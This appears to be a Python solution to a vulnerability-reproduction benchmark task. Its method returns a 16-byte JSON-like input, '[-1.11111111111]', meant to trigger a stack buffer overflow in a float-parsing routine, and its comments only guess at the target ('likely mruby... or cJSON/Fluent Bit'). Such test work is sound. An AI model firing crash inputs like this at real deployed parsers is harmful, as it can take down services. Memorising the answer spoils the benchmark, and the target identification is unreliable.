class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in a number parsing function
        # (likely mruby's mrb_read_float or similar in cJSON/Fluent Bit).
        # It is triggered by a leading minus sign followed by a long number that is
        # not "Infinity". The parser advances the pointer past the minus sign
        # and then overflows a small stack buffer when copying the digits.
        # Ground truth length is 16 bytes.
        # A JSON/Ruby array containing a negative float of sufficient length fits the criteria.
        # [-1.11111111111] is exactly 16 bytes.
        return b'[-1.11111111111]'